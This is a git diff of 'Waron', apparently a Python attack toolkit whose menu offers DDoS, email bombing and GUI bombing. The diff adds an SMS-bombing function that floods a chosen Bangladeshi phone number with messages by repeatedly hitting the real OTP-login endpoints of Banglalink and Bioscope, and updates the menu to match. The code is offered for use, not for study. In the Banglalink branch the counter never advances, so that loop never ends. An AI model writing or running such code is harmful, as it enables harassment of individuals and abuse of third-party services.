@@ -5,6 +5,7 @@ import random
 import string
 import pyautogui
 import smtplib
+import requests
 from time import sleep
 from getpass import getpass
 
@@ -18,8 +19,8 @@ banner = '''
    ████████████▀  ▄▄▄ ▀████████████
   ████████████   ████▌  ████████████     Author   : Md. Ridwanul Islam Muntakim
   █████▄    █   ██████   █    ▄█████▌    Tool Name: Waron
- ████████   ▌   █▀  ▀█   █   ████████    Version  : 0.03
- █████████  ▌   ▌ ██▄       █████████    We Are The Greatest Fear Of Our Enemies
+ ████████   ▌   █▀  ▀█   █   ████████    Version  : 0.04
+ █████████  ▌   ▌ ██▄       █████████    Learn | Hack | Secure
  ██████████▄█   ██████     ██████████    
  ▐███████████▌  ██████  ▄▄██████████
    ████████████  ▀███  ▄███████████▀
@@ -38,16 +39,16 @@ password = getpass("Enter Password: \nuser@waron:~# ")
 
 #Functions
 def runsupportbot():
-    usage = ("DDOS Example: \n------------- \nTarget IP Address: 127.0.0.1 \nTarget Port Number: 80 \n \nBombing Example: \n---------------- \nBombing Numbers: 500 \nBombing Text: Waron is here \n \nEmail Bombing Example: \n---------------------- \nYour Gmail Address: name@gmail.com \nYour Gmail Address Password: Hello Password \nTarget Email Address: name@anything.com \nAttcker Message: Waron is here \nNumber Of Emails: 100 \n \nText Repeat Example: \n-------------------- \nRepeat Numbers: 100 \nRepeat Text: Waron is here \n \nStrong Password Generate Example: \n---------------------------------\nPassword Lenght: 100")
+    usage = ("DDOS Example: \n------------- \nTarget IP Address: 127.0.0.1 \nTarget Port Number: 80 \n \nBombing Example: \n---------------- \nBombing Numbers: 500 \nBombing Text: Waron is here \n \nEmail Bombing Example: \n---------------------- \nYour Gmail Address: name@gmail.com \nYour Gmail Address Password: Hello Password \nTarget Email Address: name@anything.com \nAttcker Message: Waron is here \nNumber Of Emails: 100 \n \nText Repeat Example: \n-------------------- \nRepeat Numbers: 100 \nRepeat Text: Waron is here \n \nStrong Password Generate Example: \n---------------------------------\nPassword Lenght: 100 \n \nBangladeshi Number Bombing Example: \n-----------------------------------\nEnter Target Number: 01700000000 \nNumber Of SMS: 1000")
     print(usage)
     sys.exit()
 
 def warontoolsname():
     print("[i] Select Tool:")
     print("-"*16)
-    tools = ["[1] DDOS Attack", "[2] GUI Bombing", "[3] Email Bombing", "[4] Text Repeat", "[5] Strong Password Generate"]
+    tools = ["[1] DDOS Attack", "[2] GUI Bombing", "[3] Email Bombing", "[4] Bangladeshi Number Bombing", "[5] Text Repeat", "[6] Strong Password Generate"]
     index = 0
-    lenght = 5
+    lenght = 6
     while index < lenght:
         print(tools[index])
         index = index + 1
@@ -91,6 +92,25 @@ def runwaronemailbombing():
         print(f"Successfully {sentemail} email sent to {targetemailaddress}")
         sentemail = sentemail + 1
     emailserver.quit()
+
+def runwaronbangladeshinumberbombing():
+    targetnumber = input("Enter Target Number: \nuser@waron:~# ")
+    numberofsms = int(input("Number Of SMS: \nuser@waron:~# "))
+    sentsms = 1
+    if len(targetnumber) == 11:
+            while sentsms <= numberofsms:
+                try:
+                    if "014" in targetnumber or "019" in targetnumber:
+                        r = requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":targetnumber})
+                    else:
+                        url="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+targetnumber+"&operator=bd-otp"
+                        r = requests.get(url)
+                        print(f"Successfully {sentsms} SMS sent to {targetnumber}")
+                        sentsms = sentsms + 1
+                except:
+                    print("Sorry, no SMS was sent")
+    else:
+        print("\033[0;31m[x] The number you entered is incorrect\033[0;32m")
 
 def runwarontextrepeat():
     textcount = 1
@@ -149,8 +169,10 @@ if waronusername == username and waronpassword == password:
         elif selectiontool == 3:
             runwaronemailbombing()
         elif selectiontool == 4:
-            runwarontextrepeat()
+            runwaronbangladeshinumberbombing()
         elif selectiontool == 5:
+            runwarontextrepeat()
+        elif selectiontool == 6:
             runwaronpasswordgenerate()   
         else:
             print("\033[0;31m[x] Wrong Tool Selection\033[0;32m")
